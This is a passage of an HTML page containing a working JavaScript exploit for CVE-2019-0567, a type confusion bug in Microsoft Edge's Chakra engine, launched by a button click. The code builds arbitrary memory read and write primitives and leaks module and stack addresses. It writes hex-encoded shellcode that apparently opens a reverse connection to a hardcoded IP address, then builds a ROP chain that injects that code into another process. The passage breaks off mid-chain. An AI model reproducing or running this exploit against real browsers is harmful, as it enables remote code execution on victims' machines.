<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Based on <https://connormcgarr.github.io/type-confusion-part-1/> by Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vftable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    chakra_lo = vtableLo - 0x5d0bf8;
    chakra_hi = vtableHigh;

    document.write("[+] chakra.dll base address: 0x" + hex(chakra_hi) + hex(chakra_lo));
    document.write("<br>");

    // KERNELBASE!HeapDestroy
    iat_entry = read64(chakra_lo + 0x5EE0E8 + 0x200, chakra_hi);

    kernelbase_lo = iat_entry[0] - 0x75c60;
    kernelbase_hi = iat_entry[1];

    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbase_hi) + hex(kernelbase_lo));
    document.write("<br>");

    document.write("[+] type pointer: 0x" + hex(typeHigh) + hex(typeLo));
    document.write("<br>");

    js_library = read64(typeLo + 0x8, typeHigh);
    scriptcontext = read64(js_library[0] + 0x430, js_library[1]);
    threadcontext = read64(scriptcontext[0] + 0x5c0, scriptcontext[1]);
    stack_leak = read64(threadcontext[0] + 0x8f8, threadcontext[1]);

    document.write("[+] leaked stack address: 0x" + hex(stack_leak[1]) + hex(stack_leak[0]));
    document.write("<br>");

    let scount = 0;
    function inc() {
      scount += 0x8;
    }
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xe48348fc, 0x00cce8f0); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x51410000, 0x48525041); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x4865d231, 0x5160528b); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x18528b48, 0x20528b48); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xc9314d56, 0x50728b48); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x4ab70f48, 0xc031484a); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x7c613cac, 0x41202c02); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x410dc9c1, 0xede2c101); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x528b4852, 0x3c428b20); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x01485141, 0x788166d0); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x0f020b18, 0x00007285); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x88808b00, 0x48000000); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x6774c085, 0x44d00148); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x4920408b, 0x488bd001); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x56e35018, 0x48c9314d); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x8b41c9ff, 0x01488834); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xc03148d6, 0xc9c141ac); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xc101410d, 0xf175e038); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x244c034c, 0xd1394508); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x4458d875, 0x4924408b); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x4166d001, 0x44480c8b); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x491c408b, 0x8b41d001); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x58418804, 0x41d00148); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x5a595e58, 0x59415841); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x83485a41, 0x524120ec); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x4158e0ff, 0x8b485a59); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xff4be912, 0x485dffff); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x4953db31, 0x6e6977be); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x74656e69, 0x48564100); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xc749e189, 0x26774cc2); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x53d5ff07, 0xe1894853); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x314d5a53, 0xc9314dc0); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xba495353, 0xa779563a); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x00000000, 0x0fe8d5ff); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x31000000, 0x312e3239); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x332e3836, 0x33312e34); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x485a0038, 0xc749c189); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x0001bbc0, 0xc9314d00); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x036a5353, 0x57ba4953); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x00c69f89, 0xff000000); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x0093e8d5, 0x762f0000); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x43614565, 0x4d687851); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x526f7232, 0x6a466c2d); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x68543356, 0x39425751); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x53436c57, 0x556f734a); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x75783063, 0x68665558); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x66324956, 0x34454f76); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x4853454c, 0x4c557445); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x52376447, 0x42535974); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x7647455f, 0x544d6b52); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x51744c38, 0x5a414a68); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x3277465a, 0x73707439); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x7a335531, 0x414c4861); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x56726967, 0x36587468); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x39506137, 0x68474f31); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x5a664169, 0x79784b4c); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x76754c39, 0x4d497679); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x77324963, 0x56375044); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x2d785f4a, 0x50484131); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xc1894800, 0x58415a53); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x53c9314d, 0x0200b848); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x00008428, 0x53500000); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xc2c74953, 0x3b2e55eb); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x8948d5ff, 0x5f0a6ac6); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x89485a53, 0xc9314df1); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x53c9314d, 0xc2c74953); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x7b18062d, 0xc085d5ff); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xc7481f75, 0x001388c1); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x44ba4900, 0x00e035f0); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xff000000, 0xcfff48d5); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xcceb0274, 0x000055e8); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x6a595300, 0x89495a40); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x10e2c1d1, 0x00c0c749); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x49000010, 0x53a458ba); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x000000e5, 0x48d5ff00); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x48535393, 0x8948e789); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xda8948f1, 0x00c0c749); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x49000020, 0xba49f989); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xe2899612, 0x00000000); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x8348d5ff, 0xc08520c4); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x8b66b274, 0xc3014807); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xd275c085, 0x6a58c358); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0xc7495900, 0xa2b5f0c2); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x00d5ff56, 0x00000000); inc();

    scount += 0x100;
    rop_begin = scount;

    pop_rdi = chakra_lo + 0x75c0;  // pop rdi; ret;
    push_rdi = chakra_lo +  0x5b3d;  // push rdi; ret;
    pop_rax = chakra_lo + 0xba9b;   // pop rax; ret;
    pop_rcx = chakra_lo + 0x44b1f;  // pop rcx; ret;
    pop_rdx = chakra_lo + 0x1d2c9;  // pop rdx; ret;
    pop_r8 = chakra_lo + 0x576231;  // pop r8; ret;
    mov_r9_rcx = chakra_lo + 0xf6270;  // mov r9, rcx; cmp r8d, dword ptr [rax]; je ...; mov al, r10b; add rsp, 28h; ret;
    mov_prcx_rax = chakra_lo + 0x3bf979;  // mov qword[rcx], rax; ret;
    push_rax_pop_rsi = chakra_lo + 0x119f7;
    push_rsi_pop_rcx = chakra_lo + 0x4a9236;  // push rsi; pop rcx; adc al, 0x00; add rsp, 0x30; pop rbx; ret;
    mov_rcx_prcx = chakra_lo + 0xd2125;  // mov rcx, qword [rcx]; mov qword [rax+0x20], rcx; ret;
    virtualprotect = kernelbase_lo + 0x61700;
    virtualallocex = kernelbase_lo + 0xff00;

    write64(chakra_lo+0x74b000+scount, chakra_hi, pop_rax, chakra_hi); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, chakra_lo+0x72e128, chakra_hi); inc();  // any address with non NULL value (setup for `cmp r8d, dword ptr [rax];`)
    write64(chakra_lo+0x74b000+scount, chakra_hi, pop_rcx, chakra_hi); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, chakra_lo+0x74e030, chakra_hi); inc();  // PDWORD lpfOldProtect (any writable address)
    write64(chakra_lo+0x74b000+scount, chakra_hi, mov_r9_rcx, chakra_hi); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x90909090, 0x90909090); inc();  // padding for `add rsp, 28h;`
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x90909090, 0x90909090); inc();  // padding for `add rsp, 28h;`
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x90909090, 0x90909090); inc();  // padding for `add rsp, 28h;`
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x90909090, 0x90909090); inc();  // padding for `add rsp, 28h;`
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x90909090, 0x90909090); inc();  // padding for `add rsp, 28h;`
    write64(chakra_lo+0x74b000+scount, chakra_hi, pop_rcx, chakra_hi); inc();

    rop_offset_1 = scount;

    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x00000000, 0x00000000); inc();  // LPVOID lpAddress (shellcode address, will be updated during runtime)
    write64(chakra_lo+0x74b000+scount, chakra_hi, pop_rdx, chakra_hi); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x00001000, 0x00000000); inc();  // SIZE_T dwSize
    write64(chakra_lo+0x74b000+scount, chakra_hi, pop_r8, chakra_hi); inc();
    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x00000040, 0x00000000); inc();  // DWORD flNewProtect (PAGE_EXECUTE_READWRITE)
    write64(chakra_lo+0x74b000+scount, chakra_hi, virtualprotect, chakra_hi); inc();  // call KERNELBASE!VirtualProtect

    rop_offset_2 = scount;

    write64(chakra_lo+0x74b000+scount, chakra_hi, 0x00000000, 0x00000000); inc();  // shellcode address (will be updated during runtime)

    target_lo = chakra_lo + 0xcc1d6;
    target_hi = chakra_hi;
    let counter = 0;
    while (counter < 0x10000) {
      let tmp = read64(stack_leak[0] + counter, stack_leak[1]);
      if (tmp[0] == target_lo && tmp[1] == target_hi) {
        document.write("[+] found saved rip @ 0x" + hex(stack_leak[1]) + hex(stack_leak[0] + counter));
        document.write("<br>");
        break;
      }
      counter += 0x8;
    }

    full_jit_handle = chakra_lo + 0x74e050;

    jitHandle = read64(chakra_lo + 0x74d838, chakra_hi);
    // DuplicateHandle
    write64(stack_leak[0] + counter, stack_leak[1], pop_rdx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0xffffffff, 0xffffffff); counter += 0x8;  // HANDLE hSourceHandle current process
    write64(stack_leak[0] + counter, stack_leak[1], pop_r8, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0xffffffff, 0xffffffff); counter += 0x8;  // HANDLE hTargetProcessHandle current process
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x72e128, chakra_hi); counter += 0x8;  // any address with non NULL value (setup for `cmp r8d, dword ptr [rax];`)
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], full_jit_handle, chakra_hi); counter += 0x8;  // LPHANDLE lpTargetHandle
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], full_jit_handle, chakra_hi); counter += 0x8;  // LPHANDLE lpTargetHandle
    write64(stack_leak[0] + counter, stack_leak[1], mov_r9_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], jitHandle[0], jitHandle[1]); counter += 0x8;  // HANDLE hSourceProcessHandle

    duplicatehandle = kernelbase_lo + 0x18de0;
    write64(stack_leak[0] + counter, stack_leak[1], duplicatehandle, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;  // DWORD dwDesiredAccess
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;  // BOOL bInheritHandle
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000002, 0x00000000); counter += 0x8;  // DWORD dwOptions DUPLICATE_SAME_ACCESS

    // VirtualAllocEx
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x72e128, chakra_hi); counter += 0x8;  // any writable address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00003000, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_r9_rcx, chakra_hi); counter += 0x8;  // DWORD flAllocationType
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_r8, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x1000, 0x00000000); counter += 0x8;  // SIZE_T dwSize
    write64(stack_leak[0] + counter, stack_leak[1], pop_rdx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;  // LPVOID lpAddress
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // any writable address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], full_jit_handle, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rcx_prcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], virtualallocex, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000004, 0x00000000); counter += 0x8;  // DWORD flProtect
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;

    // WriteProcessMemory
    mapped_address_ptr = kernelbase_lo+0x21a000;
    mov_rdx_prcx = chakra_lo+0x137144;  // mov rdx, qword [rcx+rdx*8]; mov qword [rax], rdx; mov al, 0x01; ret;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mapped_address_ptr, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_prcx_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x72e128, chakra_hi); counter += 0x8;  // any non NULL address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00001000, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_r9_rcx, chakra_hi); counter += 0x8;  // SIZE_T nSize
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_r8, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74b000, chakra_hi); counter += 0x8;  // LPVOID lpBuffer
    write64(stack_leak[0] + counter, stack_leak[1], pop_rdx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;  // LPVOID lpAddress
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // any writable address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mapped_address_ptr, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rdx_prcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], full_jit_handle, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rcx_prcx, chakra_hi); counter += 0x8;

    writeproccessmemory = kernelbase_lo + 0x79a40;
    write64(stack_leak[0] + counter, stack_leak[1], writeproccessmemory, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // SIZE_T *lpNumberOfBytesWritten
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;

    // CreateRemoteThread
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x72e128, chakra_hi); counter += 0x8;  // any non NULL address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rdx+1, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_r9_rcx, chakra_hi); counter += 0x8;  // LPTHREAD_START_ROUTINE lpStartAddress
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_r8, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;  // SIZE_T dwStackSize
    write64(stack_leak[0] + counter, stack_leak[1], pop_rdx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;  // LPSECURITY_ATTRIBUTES lpThreadAttributes
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // LPVOID lpAddress
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], full_jit_handle, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rcx_prcx, chakra_hi); counter += 0x8;

    createremotethread = kernelbase_lo + 0xdcfd0;
    write64(stack_leak[0] + counter, stack_leak[1], createremotethread, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;  // LPVOID lpParameter
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000004, 0x00000000); counter += 0x8;  // DWORD dwCreationFlags
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;  // LPDWORD lpThreadId

    remotethreadhandle = kernelbase_lo + 0x21a080;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], remotethreadhandle, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_prcx_rax, chakra_hi); counter += 0x8;

    // WriteProcessMemory
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x72e128, chakra_hi); counter += 0x8;  // any non NULL address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000008, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_r9_rcx, chakra_hi); counter += 0x8;  // SIZE_T nSize
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
